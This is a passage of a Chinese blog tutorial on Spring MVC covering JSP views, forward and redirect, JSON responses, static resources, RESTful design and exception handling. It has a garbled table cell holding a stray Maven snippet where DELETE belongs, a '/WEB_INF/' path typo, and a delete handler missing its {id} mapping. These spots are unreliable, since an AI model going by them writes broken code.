<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jsp需要依赖! jstl--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建jsp页面，建议在WEB-INF文件夹下，避免被客户端访问。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- request.setAttribute(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;hello jsp!!&quot;</span>); --&gt;</span><br><span class="line">&lt;font color=<span class="string">&quot;red&quot;</span>&gt;$&#123;data&#125;&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>MVC配置类需要实现<code>WebMvcConfigurer</code>接口，重写<code>configureViewResolvers</code>方法，打开视图解析器对jsp文件的解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="comment">// handlerAdapter配置了json转化器</span></span><br><span class="line"><span class="comment">// 添加秘书，经理 给经理添加jacksonjson处理器</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureViewResolvers</span><span class="params">(ViewResolverRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// registry可以快速添加前后端</span></span><br><span class="line">        registry.jsp(<span class="string">&quot;/WEB_INF/&quot;</span>,<span class="string">&quot;.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="编写handler"><a href="#编写handler" class="headerlink" title="编写handler"></a>编写handler</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;jsp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspController</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">TODO:</span>快速查找视图</span></span><br><span class="line"><span class="comment">     *   1. 方法的返回值是字符串类型</span></span><br><span class="line"><span class="comment">     *   2. 不能添加<span class="doctag">@ResponseBody</span>,添加会直接返回字符串给浏览器，不找视图，</span></span><br><span class="line"><span class="comment">     *   无需经过视图解析器</span></span><br><span class="line"><span class="comment">     *   3. 返回值 对应中间的视图名称即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;hello jsp!&quot;</span>);</span><br><span class="line">        <span class="comment">// &quot;data&quot;需要与JSP文件中$&#123;&#125;内参数名一致</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">        <span class="comment">// JSP文件名称，与MVC配置文件的registry.jsp(&quot;/WEB_INF/&quot;连起来即文件地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="请求转发和重定向"><a href="#请求转发和重定向" class="headerlink" title="请求转发和重定向"></a>请求转发和重定向</h3><p><strong>路径说明</strong>：</p>
<ul>
<li>不使用SpringMVC请求响应优化时：<br> *  请求转发是项目下的资源跳转，路径：项目下的地址；可以忽略应用程序上下文<br> *  重定向可能不是项目下的资源，路径：项目下全地址；不能忽略应用程序上下文</li>
<li>使用SpringMVC路径语法：<ul>
<li>“forward:路径 | redirect:路径”，重定向资源地址也可以不用写（也<strong>不能写</strong>）应用程序上下文。MVC会自动为重定向项目下资源时添加应用程序上下文，如果再写会多余导致出错</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;jsp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspController</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">TODO:</span>快速查找视图</span></span><br><span class="line"><span class="comment">     *   1. 方法的返回值是字符串类型</span></span><br><span class="line"><span class="comment">     *   2. 不能添加<span class="doctag">@ResponseBody</span>,添加会直接返回字符串给浏览器，不找视图，</span></span><br><span class="line"><span class="comment">     *   无需经过视图解析器</span></span><br><span class="line"><span class="comment">     *   3. 返回值 对应中间的视图名称即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;hello jsp!&quot;</span>);</span><br><span class="line">        <span class="comment">// &quot;data&quot;需要与JSP文件中$&#123;&#125;内参数名一致</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">        <span class="comment">// JSP文件名称，与MVC配置文件的registry.jsp(&quot;/WEB_INF/&quot;连起来即文件地址</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求转发:</span></span><br><span class="line"><span class="comment">     *  1. 方法返回值写成字符串</span></span><br><span class="line"><span class="comment">     *  2. 不能使用<span class="doctag">@ResponseBody</span>注释</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &quot;forward:地址&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;forward&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">forward</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;forward:/jsp/index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重定向：</span></span><br><span class="line"><span class="comment">     *  1. 方法返回值写成字符串</span></span><br><span class="line"><span class="comment">     *  2. 不能使用<span class="doctag">@ResponseBody</span>注释</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &quot;redirect:地址&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;redirect&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">redirect</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/jsp/index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;bilibili&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">redirectBiLI</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:https://www.bilibili.com/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="返回JSON数据（重点）"><a href="#返回JSON数据（重点）" class="headerlink" title="返回JSON数据（重点）"></a>返回JSON数据（重点）</h2><h3 id="导入JSON解析依赖"><a href="#导入JSON解析依赖" class="headerlink" title="导入JSON解析依赖"></a>导入JSON解析依赖</h3><p>和接收JSON数据一样，响应JSON数据也需要导入JSON解析依赖（同上）：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="配置文件和方法"><a href="#配置文件和方法" class="headerlink" title="配置文件和方法"></a>配置文件和方法</h3><p>步骤：</p>
<ol>
<li><p>MVC配置类需要添加<code>@EnableWebMvc</code>开启注解支持</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu.jsp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法需要添加<code>@ResponseBody</code>注解。用于将方法返回的对象序列化为 JSON 或 XML 格式的数据，并发送给客户端。在前后端分离的项目中使用！</p>
<blockquote>
<p>@ResponseBody 注解可以用来标识方法或者方法返回值，表示方法的返回值是要直接返回给客户端的数据，而不是由视图解析器来解析并渲染生成响应体（viewResolver没用）。</p>
</blockquote>
</li>
</ol>
<p>添加注解后，方法返回实体类对象时，HandlerAdapter会帮我们将对象转换为JSON类型数据，此时将不会查找视图解析器，直接将JSON数据放在响应体中返回，请求转发、重定向、视图解析器全部失效</p>
<p>（@RequestBody注解则相反，方法以实体类对象为形参接收JSON数据时，HandlerAdapter会帮我们将JSON类型数据转换为对象。）</p>
<p>方法编写示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;json&quot;)</span></span><br><span class="line"><span class="comment">// @ResponseBody // 两个方法都需要添加，直接加在类上</span></span><br><span class="line"><span class="meta">@RestController</span> <span class="comment">// 相当于 @ResponseBody + @Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="comment">// @ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">data</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;TOM&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;list&quot;)</span></span><br><span class="line">    <span class="comment">// @ResponseBody</span></span><br><span class="line">    <span class="comment">// 集合转换同样，示例：</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">data1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">19</span>);</span><br><span class="line">        List&lt;User&gt; users = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        users.add(user);</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="返回静态资源"><a href="#返回静态资源" class="headerlink" title="返回静态资源"></a>返回静态资源</h2><p>在引入SpringMVC后，不能再像JavaWeb中那样使用URL直接访问到静态资源。SpringMVC下，所有的请求都会交给<code>DiapatcherServlet</code>处理，DiapatcherServlet接收请求后，会在handlerMapping中查找资源，handlerMapping会判断有没有对应的handler方法，而单纯的静态资源是无法找到处理的。</p>
<p><strong>解决方案：</strong>在MVC配置类实现<code>WebMvcConfigurer</code>接口的前提下，重写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu.jsp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCconfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">// 开启静态资源查找  </span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureDefaultServletHandling</span><span class="params">(DefaultServletHandlerConfigurer configurer)</span> &#123;</span><br><span class="line">        configurer.enable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>原理解析：</strong>这样，所有的请求都会交给<code>DiapatcherServlet</code>处理，DiapatcherServlet接收请求后，会在handlerMapping中查找资源，handlerMapping会判断有没有对应的handler方法，没有对应的handler时会返回404，此时DiapatcherServlet会将请求交给<code>DefaultServletHander</code>，调用内部<code>handleRequst</code>方法，尝试进行请求转发找到静态资源，再找不到才会最终回复404</p>
<p><code>WebMvcConfigurer</code>接口下的每一个方法都对应XML配置文件的一个标签，如下。可以找到对应XML标签的解析处理方法，分析。</p>
<blockquote>
<p>configureDefaultServletHandling() 对应 &lt;mvc:default-servlet-handler&#x2F;&gt;</p>
</blockquote>
<hr>
<h1 id="四、RESTFul风格设计和实战"><a href="#四、RESTFul风格设计和实战" class="headerlink" title="四、RESTFul风格设计和实战"></a>四、RESTFul风格设计和实战</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>引入：</strong>显然，通过以上实践，我们可以发现当我们编写后台业务处理逻辑方法时都会面临三个问题：</p>
<ol>
<li>如何设计访问路径？</li>
<li>使用哪种传递参数的方案？</li>
<li>使用哪种请求方式？</li>
</ol>
<p><strong>RESTFul：</strong>HTTP协议的标准使用方案和风格，<strong>指示如何设计访问路径，传递参数方案和请求方式。</strong></p>
<p>RESTful（Representational State Transfer）是一种软件架构风格，用于设计网络应用程序和服务之间的通信。它是一种<strong>基于标准 HTTP 方法的简单和轻量级的通信协议，广泛应用于现代的Web服务开发</strong>。通过遵循 RESTful 架构的设计原则，可以构建出易于理解、可扩展、松耦合和可重用的 Web 服务。RESTful API的特点是简单、清晰，并且易于使用和理解，它们使用标准的 HTTP 方法和状态码进行通信，不需要额外的协议和中间件。<br>总而言之，RESTful 是一种基于 HTTP 和标准化的设计原则的软件架构风格，用于设计和实现可靠、可扩展和易于集成的 Web 服务和应用程序！</p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li><p>每一个URI代表1种资源（URI 是名词）；</p>
</li>
<li><p>客户端使用GET、POST、PUT、DELETE 4个表示操作方式的动词对服务端资源进行操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源；</p>
</li>
<li><p>资源的表现形式是XML或者JSON；</p>
</li>
<li><p>客户端与服务端之间的交互在请求之间是无状态的，从客户端到服务端的每个请求都必须包含理解请求所必需的信息</p>
</li>
</ol>
<h2 id="规范（重要）"><a href="#规范（重要）" class="headerlink" title="规范（重要）"></a>规范（重要）</h2><p>总结</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>请求方式</th>
<th>常用请求参数传递方式</th>
</tr>
</thead>
<tbody><tr>
<td>查询操作</td>
<td><strong>GET</strong></td>
<td>参数是ID唯一标识，使用路径参数<br>参数是范围，不唯一标识资源，使用param参数</td>
</tr>
<tr>
<td>保存操作</td>
<td><strong>POST</strong></td>
<td>使用请求体传递JSON数据</td>
</tr>
<tr>
<td>删除操作</td>
<td><strong>DELETE</strong></td>
<td>参数是ID唯一标识，使用路径参数<br/>参数是范围参数，使用param参数</td>
</tr>
<tr>
<td>更新操作</td>
<td><strong>PUT</strong></td>
<td>使用请求体传递JSON数据</td>
</tr>
</tbody></table>
<h3 id="请求方式规范"><a href="#请求方式规范" class="headerlink" title="请求方式规范"></a>请求方式规范</h3><table>
<thead>
<tr>
<th>操作</th>
<th>请求方式</th>
</tr>
</thead>
<tbody><tr>
<td>查询操作</td>
<td><strong>GET</strong></td>
</tr>
<tr>
<td>保存操作</td>
<td><strong>POST</strong></td>
</tr>
<tr>
<td>删除操作</td>
<td>xxxxxxxxxx <groupId>org.springframework.boot</groupId><artifactId>spring-boot-maven-plugin</artifactId><version>3.0.5</version>xml</td>
</tr>
<tr>
<td>更新操作</td>
<td><strong>PUT</strong></td>
</tr>
</tbody></table>
<h3 id="URL路径规范"><a href="#URL路径规范" class="headerlink" title="URL路径规范"></a>URL路径规范</h3><p>REST风格下每个资源都应该有一个唯一的标识符，例如一个 URI（统一资源标识符）或者一个 URL（统一资源定位符），资源的标识符应该能明确地说明该资源的信息，同时也应该是可被理解和解释的！</p>
<p><strong>URI应当是一个能够明确地说明资源信息的名词，使用URL+请求方式确定具体的动作</strong>。例如对用户的相关操作，它的URL应当都是&#x2F;user&#x2F;，然后方法再限定可以访问的请求方式，从而区分不同的访问动作！</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>传统风格</th>
<th>RESTFul风格</th>
</tr>
</thead>
<tbody><tr>
<td>保存</td>
<td>&#x2F;CRUD&#x2F;saveEmp</td>
<td>URL：&#x2F;CRUD&#x2F;emp         对应方法可访问请求方式：POST</td>
</tr>
<tr>
<td>删除</td>
<td>&#x2F;CRUD&#x2F;removeEmp?empId&#x3D;2</td>
<td>URL：&#x2F;CRUD&#x2F;emp&#x2F;2    对应方法可访问请求方式：DELETE</td>
</tr>
<tr>
<td>更新</td>
<td>&#x2F;CRUD&#x2F;updateEmp</td>
<td>URL：&#x2F;CRUD&#x2F;emp         对应方法可访问请求方式：PUT</td>
</tr>
<tr>
<td>查询</td>
<td>&#x2F;CRUD&#x2F;editEmp?empId&#x3D;2</td>
<td>URL：&#x2F;CRUD&#x2F;emp&#x2F;2    对应方法可访问请求方式：GET</td>
</tr>
</tbody></table>
<h3 id="传递参数规范"><a href="#传递参数规范" class="headerlink" title="传递参数规范"></a>传递参数规范</h3><p><code>路径参数应该用于指定资源的唯一标识或者 ID，而请求参数应该用于指定查询条件或者操作参数。</code></p>
<p>参下文 实践 &#x3D;&#x3D;》接口设计分析</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p>数据结构： User {id 唯一标识,name 用户名，age 用户年龄}<br>功能分析</p>
<ul>
<li>用户数据分页展示功能（条件：page 页数 默认1，size 每页数量 默认 10）</li>
<li>保存用户功能</li>
<li>根据用户id查询用户详情功能</li>
<li>根据用户id更新用户数据功能</li>
<li>根据用户id删除用户数据功能</li>
<li>多条件模糊查询用户功能（条件：keyword 模糊关键字，page 页数 默认1，size 每页数量默认10)</li>
</ul>
<h3 id="接口设计分析"><a href="#接口设计分析" class="headerlink" title="接口设计分析"></a>接口设计分析</h3><table>
<thead>
<tr>
<th>功能</th>
<th>请求方法</th>
<th>接口（URL）</th>
<th>请求参数</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>分页查询</td>
<td>GET</td>
<td>&#x2F;user</td>
<td>page&#x3D;1&amp;size&#x3D;10   param参数</td>
<td>（响应数据）</td>
</tr>
<tr>
<td>用户添加</td>
<td>POST</td>
<td>&#x2F;user</td>
<td>(user数据)</td>
<td>（响应数据）</td>
</tr>
<tr>
<td>用户详情</td>
<td>GET</td>
<td>&#x2F;user&#x2F;1</td>
<td>路径参数</td>
<td>（响应数据）</td>
</tr>
<tr>
<td>用户更新</td>
<td>PUT</td>
<td>&#x2F;user</td>
<td>(user更新数据)</td>
<td>（响应数据）</td>
</tr>
<tr>
<td>用户删除</td>
<td>DELETE</td>
<td>&#x2F;user&#x2F;1</td>
<td>路径参数</td>
<td>（响应数据）</td>
</tr>
<tr>
<td>条件模糊</td>
<td>GET</td>
<td>&#x2F;user&#x2F;search</td>
<td>page&#x3D;1&amp;size&#x3D;10&amp;keyword&#x3D;关键字</td>
<td>（响应数据）</td>
</tr>
</tbody></table>
<p>问题：</p>
<p>为什么查询用户详情，就使用路径传递参数，多条件模糊查询，就使用请求参数传递？</p>
<blockquote>
<p>误区：restful风格下，不是所有请求参数都是路径传递！可以使用其他方式传递</p>
</blockquote>
<p>在 RESTful API 的设计中，路径和请求参数和请求体都是用来向服务器传递信息的方式。</p>
<ul>
<li>对于查询用户详情，使用路径传递参数是因为这是一个单一资源的查询，即查询一条用户记录。使用路径参数可以明确指定所请求的资源，便于服务器定位并返回对应的资源，也符合 RESTful 风格的要求。</li>
<li>对于多条件模糊查询，使用请求参数传递参数是因为这是一个资源集合的查询，即查询多条用户记录。使用请求参数可以通过组合不同参数来限制查询结果，路径参数的组合和排列可能会很多，不如使用请求参数更加灵活和简洁。 </li>
<li>此外，还有一些通用的原则可以遵循：<ul>
<li><code>路径参数应该用于指定资源的唯一标识或者 ID，而请求参数应该用于指定查询条件或者操作参数。</code></li>
<li>请求<strong>参数应该限制在10个以内</strong>，过多的请求参数可能导致接口难以维护和使用。</li>
<li><strong>敏感信息最好使用 POST和请求体</strong> 来传递参数</li>
</ul>
</li>
</ul>
<h3 id="接口设计"><a href="#接口设计" class="headerlink" title="接口设计"></a>接口设计</h3><p>示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">page</span><span class="params">(<span class="meta">@RequestParam(required = false,defaultValue = &quot;1&quot;)</span><span class="type">int</span> page,</span></span><br><span class="line"><span class="params">                           <span class="meta">@RequestParam(required = false,defaultValue = &quot;10&quot;)</span> <span class="type">int</span> size )</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;分页查询&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">addUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;添加用户&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;status&#x27;:&#x27;ok&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">userINFO</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户详情&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PutMapping</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">userUpdate</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户更新&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;status&#x27;:&#x27;ok&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@DeleteMapping</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">userDelete</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户删除&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;status&#x27;:&#x27;ok&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;search&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">usersInfo</span><span class="params">(<span class="meta">@RequestParam(required = false,defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page,</span></span><br><span class="line"><span class="params">                          <span class="meta">@RequestParam(required = false,defaultValue = &quot;10&quot;)</span> <span class="type">int</span> size,</span></span><br><span class="line"><span class="params">                          String keyword)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="五、SpringMVC其他扩展"><a href="#五、SpringMVC其他扩展" class="headerlink" title="五、SpringMVC其他扩展"></a>五、SpringMVC其他扩展</h1><h2 id="全局异常处理机制"><a href="#全局异常处理机制" class="headerlink" title="全局异常处理机制"></a>全局异常处理机制</h2><h3 id="异常处理的两种方式"><a href="#异常处理的两种方式" class="headerlink" title="异常处理的两种方式"></a>异常处理的两种方式</h3><p>对于异常的处理，一般分为两种方式：</p>
<ul>
<li><p><strong>编程式异常处理</strong>：是指在代码中显式地编写处理异常的逻辑。它通常涉及到对异常类型的检测及其处理，例如使用 try-catch 块来捕获异常，然后在 catch 块中编写特定的处理代码，或者在 finally 块中执行一些清理操作。在编程式异常处理中，开发人员需要显式地进行异常处理，异常处理代码混杂在业务代码中，导致代码可读性较差。</p>
</li>
<li><p><strong>声明式异常处理</strong>：则是将异常处理的逻辑从具体的业务逻辑中分离出来，通过配置等方式进行统一的管理和处理。在声明式异常处理中，开发人员只需要为方法或类标注相应的注解（如 @Throws 或@ExceptionHandler），就可以处理特定类型的异常。相较于编程式异常处理，声明式异常处理可以使代码更加简洁、易于维护和扩展。</p>
</li>
</ul>
<h3 id="基于注解的声明式异常处理"><a href="#基于注解的声明式异常处理" class="headerlink" title="基于注解的声明式异常处理"></a>基于注解的声明式异常处理</h3><p>主要注解：<code>&#39;@RestControllerAdvice&#39;</code>或<code>@ControllerAdvice</code>，前者返回JSON，后者返回视图、转发或重定向。</p>
<p>步骤：</p>
<ol>
<li><p>声明异常处理控制器类：&#96;&#96;</p>
</li>
<li><p>声明异常处理handler方法：</p>
<blockquote>
<p>异常处理handler方法和普通handler方法参数接收与响应都一致，</p>
<p>异常处理handler方法需要映射异常，发生对应异常时会调用。</p>
<p>普通handler方法使用<code>@RequestMapping</code>注解映射路径，发生对应路径调用</p>
</blockquote>
</li>
</ol>
<p>异常产生类示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;空指针异常&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        name.toString();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;data1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">data1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;算术异常&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">8</span>/<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>异常处理控制器：</strong></p>
